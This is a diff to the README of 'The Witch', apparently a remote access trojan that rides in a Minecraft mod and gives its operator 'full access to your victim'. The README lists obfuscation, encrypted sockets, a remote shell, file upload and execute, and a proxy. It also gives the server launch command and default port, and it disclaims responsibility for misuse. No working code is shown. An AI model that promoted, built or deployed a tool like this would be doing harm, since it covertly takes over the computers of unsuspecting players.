@@ -11,18 +11,20 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 **I am not responsible for where you use this mod.**
 
+## Showcase
+
+<img src="./img.png">
+
 ## Features
 
 ### Client
 
-- [ ] Use byte instead of String Base64
 - Obfuscate
 - Custom server name (for client display)
 - Encrypted Socket
 
 ### Server
 
-- [ ] Upload Download files and execute, filemgr
 - [ ] Received data panel
 - GUI
 - Mod combiner
@@ -30,7 +32,7 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 ### System administration
 
-- [ ] Simulated shell
+- [ ] Remote shell
 - [ ] Keep java active
 - [ ] Proxy
 - System information
@@ -78,7 +80,7 @@ The Witch system controls Minecraft clients and grant full access to your victim
 - No quit server and close window
 - Out-of-game chat system (With your victim in game)
 - Lagger
-- Open URLadd(getStringsMenu("Open URL", "open_url", "Link"));
+- Open URLs
 
 ## Running
 
@@ -87,9 +89,11 @@ The Witch system controls Minecraft clients and grant full access to your victim
 
 ## Using
 
-- Server: `java -jar server.jar <port>`
+- Server: `server.jar`
 - Default port and name: `11451`
-- Client config in Cfg.java
+- Config: `data/config`
+  - `default.json`: Client config
+  - `server.json`: Slient config
 
 ### Files:
 
